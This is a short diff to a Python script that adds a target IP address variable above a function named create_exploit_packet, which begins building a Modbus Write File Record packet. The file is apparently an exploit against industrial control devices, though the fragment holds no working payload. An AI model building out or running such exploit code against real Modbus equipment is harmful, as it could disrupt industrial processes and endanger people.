@@ -4,6 +4,8 @@ import time
 import socket
 import struct
 
+receving_ip = "10.103.152.8"
+
 def create_exploit_packet():
     # Modbus Write File Record header
     function_code = 0x15
